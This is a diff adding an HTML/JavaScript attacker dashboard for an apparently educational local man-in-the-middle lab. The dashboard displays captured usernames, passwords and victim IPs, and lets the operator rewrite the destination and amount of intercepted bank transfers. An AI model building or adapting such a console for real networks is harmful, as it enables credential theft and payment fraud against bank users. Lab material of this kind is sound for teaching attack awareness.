@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Panel Atacante — MITM</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:     #0a0000;
+    --surf:   #120505;
+    --surf2:  #1c0808;
+    --surf3:  #0a1a0a;
+    --border: #2d1010;
+    --red:    #ef4444;
+    --red-dim:#7f1d1d;
+    --yellow: #fbbf24;
+    --green:  #22c55e;
+    --blue:   #3b82f6;
+    --text:   #fca5a5;
+    --muted:  #6b2f2f;
+    --font:   'JetBrains Mono', monospace;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font);
+    min-height: 100vh;
+    padding: 20px 24px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+
+  /* ── HEADER ── */
+  header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 14px;
+  }
+  .h-title {
+    font-size: 13px; font-weight: 700; letter-spacing: .08em;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .blink { animation: blink .8s step-start infinite; }
+  @keyframes blink { 50%{ opacity: 0; } }
+  .h-stats { display: flex; gap: 24px; font-size: 12px; color: var(--muted); }
+  .h-stats strong { color: var(--red); }
+
+  /* ── TABS ── */
+  .tabs {
+    display: flex; gap: 4px;
+    background: var(--surf);
+    border: 1px solid var(--border);
+    border-radius: 10px; padding: 4px;
+    width: fit-content;
+  }
+  .tab {
+    padding: 7px 18px; border-radius: 7px; border: none;
+    background: transparent; color: var(--muted);
+    font-family: var(--font); font-size: 12px; font-weight: 600;
+    cursor: pointer; transition: all .2s; letter-spacing: .04em;
+  }
+  .tab.active { background: var(--surf2); color: var(--red); }
+  .tab-content { display: none; }
+  .tab-content.active { display: flex; flex-direction: column; gap: 16px; }
+
+  /* ── TOOLBAR ── */
+  .toolbar { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: var(--surf); border: 1px solid var(--border);
+    border-radius: 6px; padding: 6px 14px;
+    font-size: 12px; color: var(--muted);
+  }
+  .badge strong { color: var(--red); }
+  .badge-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--red); animation: pulse 1.2s infinite; }
+  @keyframes pulse { 0%,100%{ opacity:1 } 50%{ opacity:.2 } }
+  .btn-sm {
+    background: var(--surf2); border: 1px solid var(--border);
+    color: var(--muted); font-family: var(--font); font-size: 12px;
+    padding: 6px 14px; border-radius: 6px; cursor: pointer; transition: all .2s;
+  }
+  .btn-sm:hover { color: var(--red); border-color: var(--red-dim); }
+
+  /* ── TABLA CREDENCIALES ── */
+  .table-wrap {
+    background: var(--surf); border: 1px solid var(--border);
+    border-radius: 10px; overflow: hidden;
+  }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  thead th {
+    background: var(--surf2); padding: 10px 16px;
+    text-align: left; font-size: 11px; font-weight: 600;
+    letter-spacing: .06em; color: var(--muted);
+    border-bottom: 1px solid var(--border);
+  }
+  tbody tr { border-bottom: 1px solid var(--border); animation: rowIn .4s ease; }
+  @keyframes rowIn { from { opacity: 0; transform: translateY(-6px); } }
+  tbody tr:last-child { border-bottom: none; }
+  tbody td { padding: 12px 16px; color: var(--text); }
+  td.id   { color: var(--muted); width: 40px; }
+  td.hora { color: var(--muted); width: 90px; }
+  td.user { color: var(--yellow); font-weight: 600; }
+  td.pass { color: var(--red);    font-weight: 700; }
+  td.ruta { color: var(--muted);  font-size: 11px; }
+
+  .empty-state {
+    text-align: center; padding: 48px 20px;
+    color: var(--muted); font-size: 13px; line-height: 2.2;
+  }
+
+  /* ── TARJETAS DE TRANSFERENCIA ── */
+  .tx-grid {
+    display: flex; flex-direction: column; gap: 12px;
+  }
+
+  .tx-card {
+    background: var(--surf); border: 1px solid var(--border);
+    border-radius: 10px; overflow: hidden; animation: rowIn .4s ease;
+  }
+  .tx-card.pendiente { border-color: var(--yellow); }
+  .tx-card.modificado { border-color: var(--red); }
+  .tx-card.aprobado  { border-color: #1e3a1e; }
+
+  .tx-card-header {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 12px 16px; border-bottom: 1px solid var(--border);
+    background: var(--surf2);
+  }
+  .tx-card-id   { font-size: 11px; color: var(--muted); }
+  .tx-card-hora { font-size: 11px; color: var(--muted); }
+  .tx-status {
+    font-size: 11px; font-weight: 700; padding: 3px 10px;
+    border-radius: 20px; letter-spacing: .04em;
+  }
+  .tx-status.pendiente  { background: #fbbf2420; color: var(--yellow); border: 1px solid #fbbf2440; }
+  .tx-status.modificado { background: #ef444420; color: var(--red);    border: 1px solid #ef444440; }
+  .tx-status.aprobado   { background: #22c55e20; color: var(--green);  border: 1px solid #22c55e40; }
+
+  .tx-card-body { padding: 16px; display: flex; gap: 24px; flex-wrap: wrap; }
+
+  .tx-field { display: flex; flex-direction: column; gap: 4px; min-width: 120px; }
+  .tx-field label { font-size: 10px; color: var(--muted); letter-spacing: .05em; text-transform: uppercase; }
+  .tx-field .val  { font-size: 14px; font-weight: 600; color: var(--text); }
+  .tx-field .val.monto    { color: var(--yellow); font-size: 18px; }
+  .tx-field .val.destino  { color: #93c5fd; }
+  .tx-field .val.modificado-val { color: var(--red); }
+
+  .tx-diff {
+    width: 100%; margin-top: 8px; padding: 10px 14px;
+    background: #7f1d1d22; border: 1px solid #ef444430; border-radius: 8px;
+    font-size: 12px; line-height: 1.8; color: var(--red);
+  }
+  .tx-diff span { color: var(--yellow); }
+
+  /* ── PANEL DE MODIFICACIÓN ── */
+  .modify-panel {
+    border-top: 1px solid var(--border);
+    padding: 16px;
+    display: flex; flex-direction: column; gap: 12px;
+  }
+  .modify-title {
+    font-size: 11px; font-weight: 700; color: var(--red);
+    letter-spacing: .06em; text-transform: uppercase;
+  }
+  .modify-fields {
+    display: flex; gap: 10px; flex-wrap: wrap; align-items: flex-end;
+  }
+  .modify-field { display: flex; flex-direction: column; gap: 5px; flex: 1; min-width: 130px; }
+  .modify-field label { font-size: 10px; color: var(--muted); letter-spacing: .04em; text-transform: uppercase; }
+  .modify-field input {
+    background: var(--surf2); border: 1px solid var(--border);
+    border-radius: 6px; color: var(--text); font-family: var(--font);
+    font-size: 13px; padding: 8px 12px; outline: none; transition: border-color .2s;
+  }
+  .modify-field input:focus { border-color: var(--red); }
+  .modify-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+  .btn-approve {
+    padding: 8px 18px; border-radius: 6px; border: none;
+    background: #22c55e22; color: var(--green);
+    border: 1px solid #22c55e40; font-family: var(--font);
+    font-size: 12px; font-weight: 600; cursor: pointer; transition: all .2s;
+  }
+  .btn-approve:hover { background: #22c55e40; }
+  .btn-modify {
+    padding: 8px 18px; border-radius: 6px; border: none;
+    background: #ef444422; color: var(--red);
+    border: 1px solid #ef444440; font-family: var(--font);
+    font-size: 12px; font-weight: 600; cursor: pointer; transition: all .2s;
+  }
+  .btn-modify:hover { background: #ef444440; }
+
+  /* ── COUNTDOWN ── */
+  .countdown {
+    font-size: 11px; color: var(--muted);
+    display: flex; align-items: center; gap: 6px;
+  }
+  .countdown strong { color: var(--yellow); }
+
+  /* ── FOOTER ── */
+  footer {
+    font-size: 11px; color: var(--muted);
+    text-align: center; border-top: 1px solid var(--border);
+    padding-top: 12px; margin-top: auto;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="h-title">
+    <span class="blink">█</span>
+    PANEL ATACANTE — PROXY MITM :: puerto 8080
+  </div>
+  <div class="h-stats">
+    Interceptando → <strong>localhost:3000</strong>
+  </div>
+</header>
+
+<!-- TABS -->
+<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px">
+  <div class="tabs">
+    <button class="tab active" onclick="showTab('credenciales')">🔑 Credenciales</button>
+    <button class="tab"        onclick="showTab('transferencias')">💸 Transferencias</button>
+  </div>
+  <div class="toolbar">
+    <div class="badge">
+      <div class="badge-dot"></div>
+      Credenciales: <strong id="count-creds">0</strong>
+    </div>
+    <div class="badge">
+      <div class="badge-dot"></div>
+      Transferencias: <strong id="count-txs">0</strong>
+    </div>
+    <div class="badge" id="badge-pendiente" style="display:none">
+      ⚠ Pendientes: <strong id="count-pending" style="color:var(--yellow)">0</strong>
+    </div>
+    <button class="btn-sm" onclick="limpiar()">[ limpiar todo ]</button>
+  </div>
+</div>
+
+<!-- TAB: CREDENCIALES -->
+<div class="tab-content active" id="tab-credenciales">
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th><th>Hora</th><th>Usuario</th><th>Contraseña</th><th>IP Víctima</th>
+        </tr>
+      </thead>
+      <tbody id="tbody-creds"></tbody>
+    </table>
+    <div id="empty-creds" class="empty-state">
+      Sin credenciales capturadas aún.<br>
+      Abre <strong style="color:var(--text)">http://localhost:3000</strong>,
+      activa <strong style="color:var(--text)">🔴 Red comprometida</strong>
+      y envía el formulario de login.
+    </div>
+  </div>
+</div>
+
+<!-- TAB: TRANSFERENCIAS -->
+<div class="tab-content" id="tab-transferencias">
+  <div id="empty-txs" class="empty-state">
+    Sin transferencias interceptadas aún.<br>
+    Inicia sesión en <strong style="color:var(--text)">http://localhost:3000</strong>
+    y realiza una transferencia en <strong style="color:var(--text)">🔴 Red comprometida</strong>.
+  </div>
+  <div class="tx-grid" id="tx-grid"></div>
+</div>
+
+<footer>⚠ Solo para uso educativo en entorno local. Nunca en redes ajenas.</footer>
+
+<script>
+  const ADMIN = 'http://localhost:8081';
+  let lastCreds = 0;
+  let countdowns  = {};   // id → segundos restantes
+  const cdIntervals = {}; // id → intervalId del countdown
+  const estadoMap   = {}; // id → estado conocido (fuente de verdad en JS, no en el DOM)
+
+  // ─── Tabs ────────────────────────────────────────────────
+  function showTab(name) {
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+    document.getElementById('tab-' + name).classList.add('active');
+    event.target.classList.add('active');
+  }
+
+  // ─── Actualizar credenciales ──────────────────────────────
+  async function actualizarCreds() {
+    try {
+      const data = await fetch(`${ADMIN}/registros`).then(r => r.json());
+      document.getElementById('count-creds').textContent = data.length;
+
+      if (data.length === 0) {
+        document.getElementById('empty-creds').style.display = 'block';
+        document.getElementById('tbody-creds').innerHTML = '';
+        lastCreds = 0;
+        return;
+      }
+      document.getElementById('empty-creds').style.display = 'none';
+
+      if (data.length !== lastCreds) {
+        lastCreds = data.length;
+        document.getElementById('tbody-creds').innerHTML = data.slice().reverse().map(r => `
+          <tr>
+            <td class="id">${r.id}</td>
+            <td class="hora">${r.hora}</td>
+            <td class="user">${r.datos?.usuario || '—'}</td>
+            <td class="pass">${r.datos?.contrasena || '—'}</td>
+            <td class="ruta">${r.ip_victim || '—'}</td>
+          </tr>
+        `).join('');
+      }
+    } catch { /* sin conexión */ }
+  }
+
+  // ─── Actualizar transferencias ────────────────────────────
+  async function actualizarTxs() {
+    try {
+      const data = await fetch(`${ADMIN}/transferencias`).then(r => r.json());
+      document.getElementById('count-txs').textContent = data.length;
+
+      const nPendientes = data.filter(t => t.estado === 'pendiente').length;
+      document.getElementById('count-pending').textContent = nPendientes;
+      document.getElementById('badge-pendiente').style.display = nPendientes > 0 ? '' : 'none';
+
+      if (data.length === 0) {
+        document.getElementById('empty-txs').style.display = 'block';
+        document.getElementById('tx-grid').innerHTML = '';
+        return;
+      }
+      document.getElementById('empty-txs').style.display = 'none';
+
+      data.forEach(tx => {
+        const cardEl      = document.getElementById('card-' + tx.id);
+        const estadoPrevio = estadoMap[tx.id];
+
+        if (!cardEl) {
+          // ── Tarjeta nueva: insertar ──────────────────────
+          estadoMap[tx.id] = tx.estado;
+          const grid = document.getElementById('tx-grid');
+          grid.insertBefore(crearTarjeta(tx), grid.firstChild);
+          if (tx.estado === 'pendiente') iniciarCountdown(tx.id);
+
+        } else if (estadoPrevio !== tx.estado) {
+          // ── Estado cambió (pendiente → resuelto): reemplazar
+          // En este punto el atacante ya NO está escribiendo (la tx fue procesada)
+          estadoMap[tx.id] = tx.estado;
+          if (cdIntervals[tx.id]) {
+            clearInterval(cdIntervals[tx.id]);
+            delete cdIntervals[tx.id];
+          }
+          cardEl.replaceWith(crearTarjeta(tx));
+
+        }
+        // Si estadoPrevio === tx.estado y sigue 'pendiente': NO tocar nada
+      });
+
+    } catch { /* sin conexión */ }
+  }
+
+  // ─── Crear tarjeta (solo se llama cuando realmente hay que renderizar) ───
+  function crearTarjeta(tx) {
+    const isPending    = tx.estado === 'pendiente';
+    const isModificado = tx.estado === 'modificado';
+    const statusLabel  = isPending ? '⏳ PENDIENTE' : isModificado ? '💀 MODIFICADA' : '✓ APROBADA';
+
+    if (isPending && countdowns[tx.id] === undefined) countdowns[tx.id] = 30;
+
+    const diffHtml = isModificado && tx.modificado ? `
+      <div class="tx-diff">
+        ⚠ TRANSFERENCIA MODIFICADA POR EL ATACANTE<br>
+        Monto original  : <span>$${parseFloat(tx.original.monto).toLocaleString('es-CO')}</span>
+        → Enviado: <strong style="color:var(--red)">$${parseFloat(tx.modificado.monto).toLocaleString('es-CO')}</strong><br>
+        Destino original: <span>${tx.original.destino}</span>
+        → Enviado a: <strong style="color:var(--red)">${tx.modificado.destino}</strong>
+      </div>` : '';
+
+    const modifyPanel = isPending ? `
+      <div class="modify-panel">
+        <div class="modify-title">⚡ Interceptar — elige qué hacer</div>
+        <div class="modify-fields">
+          <div class="modify-field">
+            <label>Nuevo destino</label>
+            <input id="new-dest-${tx.id}" type="text" value="${tx.original.destino}">
+          </div>
+          <div class="modify-field">
+            <label>Nuevo monto</label>
+            <input id="new-monto-${tx.id}" type="number" value="${tx.original.monto}">
+          </div>
+        </div>
+        <div class="modify-actions">
+          <button class="btn-approve" onclick="aprobar('${tx.id}')">✓ Aprobar sin cambios</button>
+          <button class="btn-modify"  onclick="modificar('${tx.id}')">💀 Modificar y enviar</button>
+          <div class="countdown">Auto-aprueba en: <strong id="cd-${tx.id}">30s</strong></div>
+        </div>
+      </div>` : '';
+
+    const wrapper = document.createElement('div');
+    wrapper.innerHTML = `
+      <div class="tx-card ${tx.estado}" id="card-${tx.id}">
+        <div class="tx-card-header">
+          <div>
+            <div class="tx-card-id">${tx.id}</div>
+            <div class="tx-card-hora">${tx.hora} · IP: ${tx.ip_victim}</div>
+          </div>
+          <span class="tx-status ${tx.estado}">${statusLabel}</span>
+        </div>
+        <div class="tx-card-body">
+          <div class="tx-field">
+            <label>Monto original</label>
+            <div class="val monto">$${parseFloat(tx.original.monto).toLocaleString('es-CO')}</div>
+          </div>
+          <div class="tx-field">
+            <label>Destino original</label>
+            <div class="val destino">${tx.original.destino}</div>
+          </div>
+          ${tx.original.descripcion ? `
+          <div class="tx-field">
+            <label>Descripción</label>
+            <div class="val">${tx.original.descripcion}</div>
+          </div>` : ''}
+          ${isModificado && tx.modificado ? `
+          <div class="tx-field">
+            <label>Monto enviado</label>
+            <div class="val modificado-val">$${parseFloat(tx.modificado.monto).toLocaleString('es-CO')}</div>
+          </div>
+          <div class="tx-field">
+            <label>Destino enviado</label>
+            <div class="val modificado-val">${tx.modificado.destino}</div>
+          </div>` : ''}
+        </div>
+        ${diffHtml}
+        ${modifyPanel}
+      </div>`;
+    return wrapper.firstElementChild;
+  }
+
+  // ─── Countdown (solo actualiza el texto, nunca el DOM de la tarjeta) ────
+  function iniciarCountdown(id) {
+    if (cdIntervals[id]) return;
+    if (countdowns[id] === undefined) countdowns[id] = 30;
+
+    cdIntervals[id] = setInterval(() => {
+      if (countdowns[id] > 0) countdowns[id]--;
+      const el = document.getElementById('cd-' + id);
+      if (el) el.textContent = countdowns[id] + 's';
+      if (countdowns[id] <= 0) {
+        clearInterval(cdIntervals[id]);
+        delete cdIntervals[id];
+      }
+    }, 1000);
+  }
+
+  // ─── Aprobar ──────────────────────────────────────────────
+  async function aprobar(id) {
+    try {
+      await fetch(`${ADMIN}/aprobar/${id}`, { method: 'POST' });
+    } catch { alert('Error al aprobar'); }
+  }
+
+  // ─── Modificar ────────────────────────────────────────────
+  async function modificar(id) {
+    const destino = document.getElementById('new-dest-' + id)?.value?.trim();
+    const monto   = parseFloat(document.getElementById('new-monto-' + id)?.value);
+
+    if (!destino || isNaN(monto) || monto <= 0) {
+      alert('Completa destino y monto válidos.');
+      return;
+    }
+
+    try {
+      await fetch(`${ADMIN}/modificar/${id}`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ destino, monto }),
+      });
+    } catch { alert('Error al modificar'); }
+  }
+
+  // ─── Limpiar ──────────────────────────────────────────────
+  async function limpiar() {
+    await fetch(`${ADMIN}/limpiar`, { method: 'POST' });
+    lastCreds = 0;
+    Object.keys(estadoMap).forEach(k => delete estadoMap[k]);
+    Object.values(cdIntervals).forEach(clearInterval);
+    Object.keys(cdIntervals).forEach(k => delete cdIntervals[k]);
+    Object.keys(countdowns).forEach(k => delete countdowns[k]);
+    document.getElementById('tx-grid').innerHTML = '';
+    actualizarCreds();
+    actualizarTxs();
+  }
+
+  // ─── Loop principal ────────────────────────────────────────
+  tick();
+  setInterval(tick, 2000);
+
+  async function tick() {
+    await Promise.all([actualizarCreds(), actualizarTxs()]);
+  }
+</script>
+</body>
+</html>
